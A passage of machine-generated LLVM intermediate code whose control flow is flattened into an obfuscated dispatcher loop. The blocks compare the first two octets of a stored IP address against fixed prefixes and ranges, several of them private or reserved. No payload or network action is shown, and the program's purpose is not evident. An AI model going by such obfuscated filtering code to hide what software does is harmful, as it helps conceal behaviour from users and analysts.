  %261 = zext i8 %260 to i32
  %262 = icmp eq i32 %261, 150
  %263 = select i1 %262, i32 -1305308884, i32 -87039057
  store i32 %263, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  %265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 190
  %268 = select i1 %267, i32 -886816699, i32 -87039057
  store i32 %268, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %271 = zext i8 %270 to i32
  %272 = icmp eq i32 %271, 150
  %273 = select i1 %272, i32 -436810863, i32 -708152501
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %276 = zext i8 %275 to i32
  %277 = icmp eq i32 %276, 196
  %278 = select i1 %277, i32 -886816699, i32 -708152501
  store i32 %278, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:279:                                    ; preds = %loopEntry
  %280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %281 = zext i8 %280 to i32
  %282 = icmp eq i32 %281, 152
  %283 = select i1 %282, i32 1631236471, i32 153303996
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 82
  %288 = select i1 %287, i32 -886816699, i32 153303996
  store i32 %288, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:289:                                    ; preds = %loopEntry
  %290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %291 = zext i8 %290 to i32
  %292 = icmp eq i32 %291, 152
  %293 = select i1 %292, i32 -110080749, i32 1430300501
  store i32 %293, i32* %switchVar
  br label %loopEnd

; <label>:294:                                    ; preds = %loopEntry
  %295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %296 = zext i8 %295 to i32
  %297 = icmp eq i32 %296, 229
  %298 = select i1 %297, i32 -886816699, i32 1430300501
  store i32 %298, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:299:                                    ; preds = %loopEntry
  %300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %301 = zext i8 %300 to i32
  %302 = icmp eq i32 %301, 157
  %303 = select i1 %302, i32 1264107558, i32 569211932
  store i32 %303, i32* %switchVar
  br label %loopEnd

; <label>:304:                                    ; preds = %loopEntry
  %305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 202
  %308 = select i1 %307, i32 -886816699, i32 569211932
  store i32 %308, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %311 = zext i8 %310 to i32
  %312 = icmp eq i32 %311, 157
  %313 = select i1 %312, i32 -434609595, i32 -1098284005
  store i32 %313, i32* %switchVar
  br label %loopEnd

; <label>:314:                                    ; preds = %loopEntry
  %315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %316 = zext i8 %315 to i32
  %317 = icmp eq i32 %316, 217
  %318 = select i1 %317, i32 -886816699, i32 -1098284005
  store i32 %318, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:319:                                    ; preds = %loopEntry
  %320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %321 = zext i8 %320 to i32
  %322 = icmp eq i32 %321, 161
  %323 = select i1 %322, i32 -819585564, i32 -1801896643
  store i32 %323, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 124
  %328 = select i1 %327, i32 -886816699, i32 -1801896643
  store i32 %328, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:329:                                    ; preds = %loopEntry
  %330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %331 = zext i8 %330 to i32
  %332 = icmp eq i32 %331, 162
  %333 = select i1 %332, i32 -862073916, i32 -1031562281
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %336 = zext i8 %335 to i32
  %337 = icmp eq i32 %336, 32
  %338 = select i1 %337, i32 -886816699, i32 -1031562281
  store i32 %338, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %341 = zext i8 %340 to i32
  %342 = icmp eq i32 %341, 155
  %343 = select i1 %342, i32 -496662150, i32 1949651290
  store i32 %343, i32* %switchVar
  br label %loopEnd

; <label>:344:                                    ; preds = %loopEntry
  %345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 96
  %348 = select i1 %347, i32 -886816699, i32 1949651290
  store i32 %348, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:349:                                    ; preds = %loopEntry
  %350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %351 = zext i8 %350 to i32
  %352 = icmp eq i32 %351, 155
  %353 = select i1 %352, i32 -757902445, i32 -1101744231
  store i32 %353, i32* %switchVar
  br label %loopEnd

; <label>:354:                                    ; preds = %loopEntry
  %355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %356 = zext i8 %355 to i32
  %357 = icmp eq i32 %356, 149
  %358 = select i1 %357, i32 -886816699, i32 -1101744231
  store i32 %358, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %361 = zext i8 %360 to i32
  %362 = icmp eq i32 %361, 155
  %363 = select i1 %362, i32 -1849738317, i32 -897398318
  store i32 %363, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  %365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 155
  %368 = select i1 %367, i32 -886816699, i32 -897398318
  store i32 %368, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %371 = zext i8 %370 to i32
  %372 = icmp eq i32 %371, 155
  %373 = select i1 %372, i32 88846480, i32 35471922
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %376 = zext i8 %375 to i32
  %377 = icmp eq i32 %376, 178
  %378 = select i1 %377, i32 -886816699, i32 35471922
  store i32 %378, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %381 = zext i8 %380 to i32
  %382 = icmp eq i32 %381, 164
  %383 = select i1 %382, i32 -1541524797, i32 -956892151
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 158
  %388 = select i1 %387, i32 -886816699, i32 -956892151
  store i32 %388, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  %390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %391 = zext i8 %390 to i32
  %392 = icmp eq i32 %391, 156
  %393 = select i1 %392, i32 -441752581, i32 853690139
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 9
  %398 = select i1 %397, i32 -886816699, i32 853690139
  store i32 %398, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:399:                                    ; preds = %loopEntry
  %400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %401 = zext i8 %400 to i32
  %402 = icmp eq i32 %401, 167
  %403 = select i1 %402, i32 1296633590, i32 1849009208
  store i32 %403, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  %405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 44
  %408 = select i1 %407, i32 -886816699, i32 1849009208
  store i32 %408, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:409:                                    ; preds = %loopEntry
  %410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %411 = zext i8 %410 to i32
  %412 = icmp eq i32 %411, 168
  %413 = select i1 %412, i32 1894917971, i32 -1100816613
  store i32 %413, i32* %switchVar
  br label %loopEnd

; <label>:414:                                    ; preds = %loopEntry
  %415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 68
  %418 = select i1 %417, i32 -886816699, i32 -1100816613
  store i32 %418, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:419:                                    ; preds = %loopEntry
  %420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %421 = zext i8 %420 to i32
  %422 = icmp eq i32 %421, 168
  %423 = select i1 %422, i32 389943913, i32 -378314984
  store i32 %423, i32* %switchVar
  br label %loopEnd

; <label>:424:                                    ; preds = %loopEntry
  %425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 85
  %428 = select i1 %427, i32 -886816699, i32 -378314984
  store i32 %428, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:429:                                    ; preds = %loopEntry
  %430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %431 = zext i8 %430 to i32
  %432 = icmp eq i32 %431, 168
  %433 = select i1 %432, i32 -118436061, i32 -188836204
  store i32 %433, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %436 = zext i8 %435 to i32
  %437 = icmp eq i32 %436, 102
  %438 = select i1 %437, i32 -886816699, i32 -188836204
  store i32 %438, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:439:                                    ; preds = %loopEntry
  %440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %441 = zext i8 %440 to i32
  %442 = icmp eq i32 %441, 203
  %443 = select i1 %442, i32 -1781465014, i32 -1002669039
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 59
  %448 = select i1 %447, i32 -886816699, i32 -1002669039
  store i32 %448, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %451 = zext i8 %450 to i32
  %452 = icmp eq i32 %451, 204
  %453 = select i1 %452, i32 1712173856, i32 549316898
  store i32 %453, i32* %switchVar
  br label %loopEnd

; <label>:454:                                    ; preds = %loopEntry
  %455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %456 = zext i8 %455 to i32
  %457 = icmp eq i32 %456, 34
  %458 = select i1 %457, i32 -886816699, i32 549316898
  store i32 %458, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:459:                                    ; preds = %loopEntry
  %460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %461 = zext i8 %460 to i32
  %462 = icmp eq i32 %461, 207
  %463 = select i1 %462, i32 241101006, i32 2026072626
  store i32 %463, i32* %switchVar
  br label %loopEnd

; <label>:464:                                    ; preds = %loopEntry
  %465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 30
  %468 = select i1 %467, i32 -886816699, i32 2026072626
  store i32 %468, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:469:                                    ; preds = %loopEntry
  %470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %471 = zext i8 %470 to i32
  %472 = icmp eq i32 %471, 117
  %473 = select i1 %472, i32 -1855696025, i32 -70733831
  store i32 %473, i32* %switchVar
  br label %loopEnd

; <label>:474:                                    ; preds = %loopEntry
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 55
  %478 = select i1 %477, i32 -886816699, i32 -70733831
  store i32 %478, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:479:                                    ; preds = %loopEntry
  %480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %481 = zext i8 %480 to i32
  %482 = icmp eq i32 %481, 117
  %483 = select i1 %482, i32 -588796058, i32 -268819456
  store i32 %483, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  %485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 56
  %488 = select i1 %487, i32 -886816699, i32 -268819456
  store i32 %488, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %491 = zext i8 %490 to i32
  %492 = icmp eq i32 %491, 80
  %493 = select i1 %492, i32 145706434, i32 913008154
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 235
  %498 = select i1 %497, i32 -886816699, i32 913008154
  store i32 %498, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  %500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %501 = zext i8 %500 to i32
  %502 = icmp eq i32 %501, 207
  %503 = select i1 %502, i32 433511616, i32 -1722670367
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 120
  %508 = select i1 %507, i32 -886816699, i32 -1722670367
  store i32 %508, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %511 = zext i8 %510 to i32
  %512 = icmp eq i32 %511, 209
  %513 = select i1 %512, i32 1234923463, i32 -1799177123
  store i32 %513, i32* %switchVar
  br label %loopEnd

; <label>:514:                                    ; preds = %loopEntry
  %515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %516 = zext i8 %515 to i32
  %517 = icmp eq i32 %516, 35
  %518 = select i1 %517, i32 -886816699, i32 -1799177123
  store i32 %518, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  %520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %521 = zext i8 %520 to i32
  %522 = icmp eq i32 %521, 64
  %523 = select i1 %522, i32 134532184, i32 -1796006511
  store i32 %523, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  %525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 70
  %528 = select i1 %527, i32 -886816699, i32 -1796006511
  store i32 %528, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:529:                                    ; preds = %loopEntry
  %530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %531 = zext i8 %530 to i32
  %532 = icmp eq i32 %531, 172
  %533 = select i1 %532, i32 -648636096, i32 -1666080216
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp sge i32 %536, 16
  %538 = select i1 %537, i32 1527131370, i32 -1666080216
  store i32 %538, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %541 = zext i8 %540 to i32
  %542 = icmp slt i32 %541, 32
  %543 = select i1 %542, i32 -886816699, i32 -1666080216
  store i32 %543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:544:                                    ; preds = %loopEntry
  %545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %546 = zext i8 %545 to i32
  %547 = icmp eq i32 %546, 100
  %548 = select i1 %547, i32 -1808819435, i32 655964172
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %551 = zext i8 %550 to i32
  %552 = icmp sge i32 %551, 64
  %553 = select i1 %552, i32 -2116055128, i32 655964172
  store i32 %553, i32* %switchVar
  br label %loopEnd

; <label>:554:                                    ; preds = %loopEntry
  %555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp slt i32 %556, 127
  %558 = select i1 %557, i32 -886816699, i32 655964172
  store i32 %558, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %561 = zext i8 %560 to i32
  %562 = icmp eq i32 %561, 169
  %563 = select i1 %562, i32 480570408, i32 417161250
  store i32 %563, i32* %switchVar
  br label %loopEnd

; <label>:564:                                    ; preds = %loopEntry
  %565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %566 = zext i8 %565 to i32
  %567 = icmp eq i32 %566, 254
  %568 = select i1 %567, i32 -886816699, i32 417161250
  store i32 %568, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:569:                                    ; preds = %loopEntry
  %570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %571 = zext i8 %570 to i32
  %572 = icmp eq i32 %571, 198
  %573 = select i1 %572, i32 466401314, i32 -692838405
  store i32 %573, i32* %switchVar
  br label %loopEnd

; <label>:574:                                    ; preds = %loopEntry
  %575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %576 = zext i8 %575 to i32
  %577 = icmp sge i32 %576, 18
  %578 = select i1 %577, i32 486647128, i32 -692838405
  store i32 %578, i32* %switchVar
  br label %loopEnd

; <label>:579:                                    ; preds = %loopEntry
  %580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %581 = zext i8 %580 to i32
  %582 = icmp slt i32 %581, 20
  %583 = select i1 %582, i32 -886816699, i32 -692838405
  store i32 %583, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:584:                                    ; preds = %loopEntry
  %585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %586 = zext i8 %585 to i32
  %587 = icmp eq i32 %586, 64
  %588 = select i1 %587, i32 196652401, i32 -256073832
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %591 = zext i8 %590 to i32
  %592 = icmp sge i32 %591, 69
  %593 = select i1 %592, i32 198752544, i32 -256073832
  store i32 %593, i32* %switchVar
  br label %loopEnd

; <label>:594:                                    ; preds = %loopEntry
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp slt i32 %596, 227
  %598 = select i1 %597, i32 -886816699, i32 -256073832
  store i32 %598, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:599:                                    ; preds = %loopEntry
  %600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %601 = zext i8 %600 to i32
  %602 = icmp eq i32 %601, 128
  %603 = select i1 %602, i32 1057213214, i32 383398861
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %606 = zext i8 %605 to i32
  %607 = icmp sge i32 %606, 35
  %608 = select i1 %607, i32 -202799890, i32 383398861
  store i32 %608, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  %610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %611 = zext i8 %610 to i32
  %612 = icmp slt i32 %611, 237
  %613 = select i1 %612, i32 -886816699, i32 383398861
  store i32 %613, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:614:                                    ; preds = %loopEntry
  %615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %616 = zext i8 %615 to i32
  %617 = icmp eq i32 %616, 129
  %618 = select i1 %617, i32 -1382556860, i32 -1313292224
  store i32 %618, i32* %switchVar
  br label %loopEnd

; <label>:619:                                    ; preds = %loopEntry
  %620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %621 = zext i8 %620 to i32
  %622 = icmp sge i32 %621, 22
  %623 = select i1 %622, i32 1056592910, i32 -1313292224
  store i32 %623, i32* %switchVar
  br label %loopEnd

; <label>:624:                                    ; preds = %loopEntry
  %625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %626 = zext i8 %625 to i32
  %627 = icmp slt i32 %626, 255
  %628 = select i1 %627, i32 -886816699, i32 -1313292224
  store i32 %628, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  %630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %631 = zext i8 %630 to i32
  %632 = icmp eq i32 %631, 130
  %633 = select i1 %632, i32 595052173, i32 487413656
  store i32 %633, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %636 = zext i8 %635 to i32
  %637 = icmp sge i32 %636, 40
  %638 = select i1 %637, i32 -1880333291, i32 487413656
  store i32 %638, i32* %switchVar
  br label %loopEnd

; <label>:639:                                    ; preds = %loopEntry
  %640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %641 = zext i8 %640 to i32
  %642 = icmp slt i32 %641, 168
  %643 = select i1 %642, i32 -886816699, i32 487413656
  store i32 %643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:644:                                    ; preds = %loopEntry
  %645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %646 = zext i8 %645 to i32
  %647 = icmp eq i32 %646, 131
  %648 = select i1 %647, i32 497360525, i32 1797021440
  store i32 %648, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  %650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %651 = zext i8 %650 to i32
  %652 = icmp sge i32 %651, 3
  %653 = select i1 %652, i32 -1501788143, i32 1797021440
  store i32 %653, i32* %switchVar
  br label %loopEnd

; <label>:654:                                    ; preds = %loopEntry
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp slt i32 %656, 251
  %658 = select i1 %657, i32 -886816699, i32 1797021440
  store i32 %658, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:659:                                    ; preds = %loopEntry
  %660 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %661 = zext i8 %660 to i32
  %662 = icmp eq i32 %661, 132
  %663 = select i1 %662, i32 -480639031, i32 -1714676831
  store i32 %663, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  %665 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %666 = zext i8 %665 to i32
  %667 = icmp sge i32 %666, 3
  %668 = select i1 %667, i32 -1211761950, i32 -1714676831
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %671 = zext i8 %670 to i32
  %672 = icmp slt i32 %671, 251
  %673 = select i1 %672, i32 -886816699, i32 -1714676831
  store i32 %673, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:674:                                    ; preds = %loopEntry
